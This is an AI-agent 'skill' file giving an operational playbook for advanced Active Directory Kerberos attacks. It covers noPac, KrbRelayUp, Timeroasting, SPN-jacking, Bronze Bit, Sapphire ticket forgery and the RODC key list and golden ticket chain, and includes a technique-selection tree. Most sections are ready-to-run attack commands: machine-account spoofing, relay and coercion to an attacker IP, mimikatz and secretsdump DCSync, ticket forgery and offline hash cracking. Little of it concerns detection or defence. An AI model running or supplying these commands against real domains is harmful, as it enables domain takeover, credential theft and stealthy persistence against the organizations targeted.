---
name: kerberos-advanced-attack
description: "Collection of advanced Kerberos protocol attack techniques. Use the advanced techniques in this skill when basic Kerberoasting/AS-REP Roasting and delegation attacks are insufficient. Covers sAMAccountName spoofing (noPac/CVE-2021-42278), Kerberos relay (KrbRelayUp), Timeroasting (NTP unauthenticated hash extraction), ASREQroast (MITM AS-REQ capture), SPN-jacking (targeted Kerberoasting), UnPAC-the-hash (certificate to NT Hash), Sapphire ticket (high-stealth ticket forgery), Bronze Bit (CVE-2020-17049 delegation bypass), RODC attack chain (key list export/RODC Golden Ticket/RODC DACL abuse)."
zh-signals: "高级 Kerberos 攻击集合，含 noPac、Kerberos relay、Timeroasting、Sapphire ticket 与 RODC 攻击链。信号:Kerberos,noPac,Timeroasting,RODC,Bronze Bit"
when-to-use: "Use when basic Kerberoasting/AS-REP roasting and delegation attacks are insufficient and advanced Kerberos techniques are needed."
metadata:
  tags: "kerberos,nopac,samaccountname,CVE-2021-42278,CVE-2021-42287,krbrelayup,kerberos relay,timeroasting,asreqroast,spn-jacking,unpac,sapphire ticket,bronze bit,CVE-2020-17049,RODC,read-only domain controller,kerberos key list,pre-windows 2000"
  category: "lateral"
---

# Advanced Kerberos Attacks

## Trigger Conditions

- Advanced Kerberos techniques are required (noPac / KrbRelayUp / Timeroasting / RODC)
- Basic Kerberoasting and delegation attacks are insufficient
- An RODC (read-only domain controller) has been discovered
- A higher-stealth ticket forgery is needed (Sapphire ticket)

## Prerequisites

| Technique | Required credential | Key tools |
|------|---------|---------|
| Timeroasting | No credential | timeroast, netexec |
| ASREQroast | No credential (MITM required) | PCredz |
| noPac | Low-privileged domain user | noPac.py, Impacket |
| KrbRelayUp | Local SYSTEM | KrbRelayUp, krbrelayx |
| SPN-jacking | Domain user + WriteSPN | Impacket, tgssub |
| UnPAC-the-hash | User certificate | PKINITtools, Rubeus |
| Bronze Bit | Constrained delegation service account | Impacket getST |
| Sapphire ticket | krbtgt hash | Impacket ticketer |
| RODC attack chain | Depends on the stage | Rubeus, bloodyAD, keylistattack |

## Technique Selection Decision Tree

```
What do you currently have?
├── No credential / no authentication
│   ├── DC NTP reachable -> Timeroasting
│   └── MITM position available -> ASREQroast
├── Low-privileged domain user
│   ├── MAQ > 0 -> sAMAccountName spoofing (noPac)
│   └── WriteSPN rights -> SPN-jacking
├── Local SYSTEM (no domain credential)
│   └── LDAP signing not enforced -> KrbRelayUp
├── Hold a certificate
│   └── UnPAC-the-hash
├── Constrained delegation available + target is protected
│   └── Bronze Bit (CVE-2020-17049)
├── Already hold the krbtgt hash
│   └── High stealth required -> Sapphire ticket
└── Discovered an RODC
    └── RODC attack chain
```

---

## 1. Timeroasting — NTP Unauthenticated Hash Extraction

### How It Works

The DC's NTP service computes the MAC value in NTP responses using the computer account's NTLM hash (an MD5-based key). An attacker needs no authentication at all: by sending NTP requests with different RIDs, they can obtain the computer account's SNTP hash for offline cracking. This hash is based on an RC4 key, so computer accounts using weak passwords (such as Pre-Windows 2000 devices) can be cracked quickly.

### Prerequisites

- Network access to the DC NTP port (UDP 123)
- No authentication credential required

### Core Commands

```bash
# Unauthenticated enumeration - Linux
python3 timeroast.py "$DC_IP"

# netexec module
netexec smb "$DC_IP" -M timeroast

# Windows - authenticated mode (can generate a targeted wordlist)
Invoke-AuthenticatedTimeRoast -DomainController $DC_IP
Invoke-AuthenticatedTimeRoast -DomainController $DC_IP -GenerateWordlist
```

```bash
# Crack the SNTP hash
hashcat -m 31300 -a 0 -O hashes.txt $WORDLIST --username
```

### Success Indicators

- SNTP hash file obtained
- hashcat cracks the computer account password
- Note: cracking is roughly 10x faster than with Kerberos TGS hashes

---

## 2. ASREQroast — MITM AS-REQ Capture

### How It Works

When the attacker holds a MITM position (ARP spoofing, ICMP redirect, DHCPv6 poisoning), they can capture the encrypted timestamp in a domain user's normal Kerberos pre-authentication AS-REQ. This timestamp is encrypted with a key derived from the user password and can be cracked offline. Unlike AS-REP Roasting, ASREQroast does not require the target to have pre-authentication disabled.

### Prerequisites

- MITM position (ARP/ICMP redirect/DHCPv6)
- No domain credential required

### Core Commands

```bash
# Capture in real time
Pcredz -i $INTERFACE -v

# Extract from a pcap file
Pcredz -f "$PCAP_FILE"

# Batch extract from a directory
Pcredz -d "$PCAP_DIR"
```

```bash
# Crack AS-REQ Pre-Auth etype 23
hashcat -m 7500 asreq_hashes.txt $WORDLIST
```

### Success Indicators

- Captured AS-REQ encrypted timestamp hashes for users
- hashcat recovers the plaintext user password

---

## 3. sAMAccountName Spoofing (noPac) — CVE-2021-42278 + CVE-2021-42287

### How It Works

CVE-2021-42278 allows changing a computer account's sAMAccountName to a value without the trailing `$`. CVE-2021-42287 makes the KDC automatically append `$` when it cannot find the requester. Chaining the two: create a machine account -> rename it to the DC name (without `$`) -> request a TGT -> rename it back -> use the TGT with S4U2self to obtain a highly privileged TGS for the DC.

### Prerequisites

- Low-privileged domain user credential
- MAQ (ms-DS-MachineAccountQuota) > 0
- Patches KB5008102 + KB5008380 not installed

### Core Commands

```bash
# Automated - one-shot exploitation
noPac.py $DOMAIN/$USER:'$PASSWORD' -dc-ip $DC_IP --impersonate Administrator -dump
noPac.py $DOMAIN/$USER:'$PASSWORD' -dc-ip $DC_IP --impersonate Administrator -use-ldap -dump
```

```bash
# Manual chain - UNIX (Impacket)
# Step 1: Create the machine account
addcomputer.py -computer-name 'FAKEPC$' -computer-pass 'FakePass123' -dc-ip $DC_IP "$DOMAIN/$USER:$PASSWORD"

# Step 2: Clear the SPN (avoid constraint checks)
addspn.py --clear -t 'FAKEPC$' -u "$DOMAIN/$USER" -p "$PASSWORD" "$DC_IP"

# Step 3: Rename to the DC
renameMachine.py -current-name 'FAKEPC$' -new-name "$DC_NAME" -dc-ip $DC_IP "$DOMAIN/$USER:$PASSWORD"

# Step 4: Request a TGT using the DC name
getTGT.py -dc-ip $DC_IP "$DOMAIN/$DC_NAME:FakePass123"

# Step 5: Rename back to the original name
renameMachine.py -current-name "$DC_NAME" -new-name 'FAKEPC$' -dc-ip $DC_IP "$DOMAIN/$USER:$PASSWORD"

# Step 6: Use S4U2self to obtain the DC ST
export KRB5CCNAME="$DC_NAME.ccache"
getST.py -self -impersonate "Administrator" -altservice "cifs/$DC_FQDN" -k -no-pass -dc-ip $DC_IP "$DOMAIN/$DC_NAME"

# Step 7: DCSync
export KRB5CCNAME="Administrator@cifs_$DC_FQDN@$DOMAIN.ccache"
secretsdump.py -k -no-pass -dc-ip $DC_IP "$DC_FQDN"
```

```powershell
# Manual chain - Windows
New-Machineaccount -MachineAccount "FAKEPC" -Password $(ConvertTo-SecureString "FakePass123" -AsPlainText -Force) -Domain $DOMAIN
Set-DomainObject "FAKEPC$" -Clear 'servicePrincipalName'
Set-MachineAccountAttribute -MachineAccount "FAKEPC" -Value "$DC_NAME" -Attribute samaccountname
Rubeus.exe asktgt /user:"$DC_NAME" /password:"FakePass123" /domain:$DOMAIN /dc:$DC_FQDN /nowrap
Set-MachineAccountAttribute -MachineAccount "FAKEPC" -Value "FAKEPC$" -Attribute samaccountname
Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"cifs/$DC_FQDN" /dc:$DC_FQDN /ptt /ticket:$TGT_BASE64
mimikatz.exe "lsadump::dcsync /domain:$DOMAIN /user:Administrator"
```

### Success Indicators

- Obtained the DC's cifs/ldap service ticket
- DCSync successfully exported hashes from the domain

---

## 4. KrbRelayUp — Local Kerberos Relay Privilege Escalation

### How It Works

In a scenario where local SYSTEM access has already been obtained, relay the machine account's Kerberos authentication to the LDAP service, configure RBCD (Resource-Based Constrained Delegation), then leverage an S4U chain to obtain a local administrator ticket, escalating from SYSTEM to high privileges in the domain.

### Prerequisites

- Local SYSTEM access
- LDAP signing not enforced
- MAQ > 0 or a controlled machine account

### Core Commands

```bash
# Base exploitation
KrbRelayUp.exe relay -Domain $DOMAIN -CreateNewComputerAccount -ComputerName YOURPC$ -ComputerPassword Pass
KrbRelayUp.exe spawn -m rbcd -d $DOMAIN -dc $DC_FQDN -cn YOURPC$ -cp Pass
```

```bash
# DNS poisoning relay variant (krbrelayx + mitm6)
krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER_IP \
  --victim $TARGET_SAMNAME --adcs --template Machine

mitm6 -i $INTERFACE -d $DOMAIN -hw $TARGET_FQDN --relay $ADCS_FQDN -v
```

```bash
# Coerced auth relay variant
dnstool.py -u "$DOMAIN\\$USER" -p "$PASSWORD" -r attacker.$DOMAIN -a add -t A -d $ATTACKER_IP $DC_IP
krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER_IP --victim $TARGET_SAMNAME --adcs --template Machine
PetitPotam.py attacker.$DOMAIN@80/test $TARGET_IP
```

### Success Indicators

- RBCD successfully written into msDS-AllowedToActOnBehalfOfOtherIdentity
- S4U obtained a local administrator ticket
- Local escalation to SYSTEM / lateral movement in the domain

---

## 5. SPN-jacking — Targeted Kerberoasting via KCD + DACL

### How It Works

When you hold WriteSPN rights on an account and the environment already has KCD configured, you can "move" the target SPN onto an account you control, request a ticket through the S4U chain, and finally use tgssub to edit the SPN field inside the ticket to point at the real target.

### Prerequisites

- KCD (constrained delegation) is configured
- WriteSPN rights on another account

### Core Commands

```bash
# UNIX - full SPN-jacking flow
# Step 1: Clear target B's SPN
addspn.py --clear -t 'ServerB$' -u "$DOMAIN/$USER" -p "$PASSWORD" "$DC_IP"

# Step 2: Add B's SPN to the controllable account C
addspn.py -t 'ServerC$' --spn "cifs/serverB.$DOMAIN" -u "$DOMAIN/$USER" -p "$PASSWORD" "$DC_IP"

# Step 3: Request the ticket via S4U
getST.py -spn "cifs/serverB.$DOMAIN" -impersonate "Administrator" "$DOMAIN/serverA\$:$PASSWORD"

# Step 4: Edit the ticket SPN
tgssub.py -in serverB.ccache -out final.ccache -altservice "cifs/serverC.$DOMAIN"
```

```powershell
# Windows
Set-DomainObject -Identity ServerB$ -Clear servicePrincipalName
Set-DomainObject -Identity ServerC$ -Set @{serviceprincipalname="cifs/serverB.$DOMAIN"}
Rubeus.exe s4u /ticket:$TGT /impersonateuser:Administrator /msdsspn:"cifs/serverB.$DOMAIN" /altservice:"cifs/serverC.$DOMAIN" /ptt
```

### Success Indicators

- Obtained a valid ST for the target service
- Can access the target service (cifs/http/mssql, etc.)

---

## 6. UnPAC-the-hash — PKINIT Certificate to NT Hash

### How It Works

The PAC in a TGT obtained via PKINIT contains the user's NT hash. Using the User-to-User (U2U) request mechanism, you encrypt your own TGS with your own TGT and then extract the NT hash from it. This is commonly used for credential extraction after ADCS exploitation or Shadow Credentials attacks.

### Prerequisites

- Hold a valid certificate for the target user (.pfx/.pem)
- Usually obtained from ADCS exploitation or a Shadow Credentials write

### Core Commands

```bash
# PKINITtools - Linux
gettgtpkinit.py -cert-pfx "$CERT_PFX" -pfx-pass "$PFX_PASS" "$DOMAIN/$USER" tgt.ccache
# Record the AS-REP encryption key from the output

getnthash.py -key '$AS_REP_KEY' '$DOMAIN'/'$USER'
```

```powershell
# Rubeus - Windows
Rubeus.exe asktgt /getcredentials /user:"$USER" /certificate:"$CERT_PFX" /password:"$PFX_PASS" /domain:"$DOMAIN" /dc:"$DC_FQDN" /show
```

### Success Indicators

- Successfully obtained the target user's NT hash
- Usable for Pass-the-Hash or further attacks

---

## 7. Bronze Bit (CVE-2020-17049) — Bypassing the Delegation Forwardable Flag

### How It Works

The forwardable flag on tickets obtained via S4U2self is set by the KDC based on whether the target user belongs to the Protected Users group or is marked as sensitive. The Bronze Bit attack directly modifies the forwardable bit in the ticket (because the ticket is encrypted with the service account key, which the attacker already holds), bypassing the restriction so the ticket can be used for S4U2proxy.

### Prerequisites

- Control of a service account configured for constrained delegation
- The target user is in the Protected Users group or flagged "Account is sensitive and cannot be delegated"

### Core Commands

```bash
getST.py -force-forwardable \
  -spn "$TARGET_SPN" \
  -impersonate "Administrator" \
  -dc-ip "$DC_IP" \
  -hashes :"$NT_HASH" \
  "$DOMAIN/$SERVICE_ACCOUNT"
```

### Success Indicators

- Obtained a forwardable ST for a protected user
- Can access the delegated target service

---

## 8. Sapphire Ticket — High-Stealth Ticket Forgery

### How It Works

An advanced variant of the Diamond Ticket. Ordinary Golden/Diamond Tickets use a forged PAC, while the Sapphire Ticket obtains the target user's real PAC through S4U2self + U2U and substitutes it into the forged ticket. Because the PAC carries the KDC's real signature, detection is extremely difficult.

### Prerequisites

- Obtained the krbtgt hash (AES + NT hash)
- Know the target user's RID and the domain SID

### Core Commands

```bash
ticketer.py -request \
  -impersonate 'domainadmin' \
  -domain '$DOMAIN' \
  -user '$USER' \
  -password '$PASSWORD' \
  -nthash '$KRBTGT_NT' \
  -aesKey '$KRBTGT_AES' \
  -user-id '$TARGET_RID' \
  -domain-sid '$DOMAIN_SID' \
  'baduser'
```

### Notes

- After the KB5008380 patch the KDC validates the PAC_REQUESTOR and PAC_ATTRIBUTES_INFO structures
- Missing these fields can trigger KDC_ERR_TGT_REVOKED
- Compared with Golden/Diamond: Sapphire uses a real PAC (obtained via S4U) and is the hardest to detect

### Success Indicators

- Obtained a forged ticket containing a real PAC
- The ticket passes KDC validation normally

---

## 9. RODC Attack Chain

### How It Works

A read-only domain controller (RODC) holds its own krbtgt key (krbtgt_XXXXX) and uses the password replication policy (PRP) to control whose account keys may be cached. Attacking an RODC allows extracting the keys of accounts that are allowed to be cached, or modifying the PRP via DACL to widen the impact.

### Enumerating RODC

```bash
# LDAP query
ldapsearch -H ldap://$DC_IP -b "DC=$DOMAIN_DN" "(primaryGroupID=521)" dn sAMAccountName msDS-SecondaryKrbTgtNumber

# netexec
nxc ldap $DC_IP -u "$USER" -p "$PASSWORD" -M rodc
```

### PRP Policy Query

```bash
# msDS-RevealOnDemandGroup - the allowed-to-cache list
# msDS-NeverRevealGroup - the denied-to-cache list
ldapsearch -H ldap://$DC_IP -b "CN=$RODC_NAME,OU=Domain Controllers,DC=$DOMAIN_DN" \
  msDS-RevealOnDemandGroup msDS-NeverRevealGroup managedBy
```

### Key List Attack — Extracting Cached Keys

```bash
# Full mode (includes the Denied entries)
keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" -full "$DOMAIN/$USER:$PASS"@"$RODC"

# Normal mode (respects the Denied list)
keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" "$DOMAIN/$USER:$PASS"@"$RODC"

# Specific user mode
keylistattack.py -rodcNo "$KRBTGT_NUM" -rodcKey "$KRBTGT_AES" -t "$TARGET_USER" "$DOMAIN/$USER:$PASS"@"$RODC"
```

```powershell
# Windows - Rubeus
Rubeus.exe golden /rodcNumber:$KRBTGT_NUM /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:rodc.kirbi /aes256:$KRBTGT_AES /user:$USER /id:$RID /domain:$DOMAIN /sid:$SID
Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:rodc.kirbi /service:krbtgt/$DOMAIN
```

### RODC Golden Ticket

```powershell
Rubeus.exe golden /rodcNumber:$KRBTGT_NUM /flags:forwardable,renewable,enc_pa_rep /nowrap \
  /outfile:ticket.kirbi /aes256:$KRBTGT_AES \
  /user:Administrator /id:500 /domain:$DOMAIN /sid:$DOMAIN_SID
```

- The kvno field must match the RODC's krbtgt version number
- When the ticket is submitted to a writable DC, the PAC is recomputed and validated

### RODC DACL Abuse — Modifying the PRP to Widen the Impact

```bash
# bloodyAD - add administrators to the allowed list
bloodyAD -d $DOMAIN -u "$USER" -p "$PASSWORD" --dc-ip $DC_IP set object "$RODC_DN" \
  msDS-RevealOnDemandGroup -v "CN=Domain Admins,CN=Users,DC=$DOMAIN_DN"

# bloodyAD - clear the denied list
bloodyAD -d $DOMAIN -u "$USER" -p "$PASSWORD" --dc-ip $DC_IP set object "$RODC_DN" \
  msDS-NeverRevealGroup
```

```python
# powerview.py
Set-DomainObject -Identity "$RODC_DN" -Append @{'msDS-RevealOnDemandGroup'='CN=Domain Admins,CN=Users,DC=$DOMAIN_DN'}
Set-DomainObject -Identity "$RODC_DN" -Clear 'msDS-NeverRevealGroup'
```

- Attack chain: modify the PRP -> export krbtgt_XXXXX -> RODC Golden Ticket -> Key List attack

### Pre-Windows 2000 Computer Accounts

```bash
# Default password = lowercase computer name without the $
# Filter: UAC=4128 + logonCount=0
ldapsearch -H ldap://$DC_IP -b "DC=$DOMAIN_DN" "(&(userAccountControl=4128)(logonCount=0))" sAMAccountName

# Bulk validation
nxc smb $DC_IP -u computers.txt -p passwords.txt --no-bruteforce

# Kerberos authentication
getTGT.py "$DOMAIN/OLDPC\$:oldpc"
```

### Success Indicators

- Extracted the target account's NT hash
- Obtained an RODC Golden Ticket
- After modifying the PRP, high-privileged account keys can be cached

---

## Further Reading

- → [references/kerberos-escalation.md](references/kerberos-escalation.md) — Full command reference for noPac / KrbRelayUp / Bronze Bit / SPN-jacking / Timeroasting / ASREQroast / UnPAC / Sapphire
- → [references/rodc-attack.md](references/rodc-attack.md) — RODC concepts, Key List attack, RODC Golden Ticket, DACL abuse, Pre-Windows 2000
